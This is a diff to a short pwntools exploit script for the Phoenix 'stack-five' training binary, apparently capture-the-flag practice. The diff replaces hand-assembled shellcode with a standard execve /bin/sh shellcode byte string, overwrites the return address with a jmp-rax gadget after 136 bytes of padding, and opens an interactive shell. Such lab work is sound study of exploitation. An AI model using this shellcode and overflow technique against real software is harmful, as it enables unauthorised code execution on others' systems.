@@ -2,10 +2,11 @@ from pwn import *
 shell = ssh("user", "localhost", password="user", port=2222)
 
 total = 136
-sc = b"/bin/sh\0"+asm("mov rax,0x3b;mov rdi,0x7fffffffe5d0;xor rsi,rsi;xor rdx,rdx;syscall", arch="amd64")
-s = sc+b"a"*(total-len(sc))+p64(0x7fffffffe5d0+8)
-open("sc.txt", "wb").write(s)
+sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+jmp_rax = p64(0x400481)
+s = sc+b"a"*(total-len(sc))+jmp_rax
+
 sh = shell.run(b"/opt/phoenix/amd64/stack-five")
 sh.recvlines(1)
 sh.sendline(s)
-print(sh.recvlines(2))
+sh.interactive()
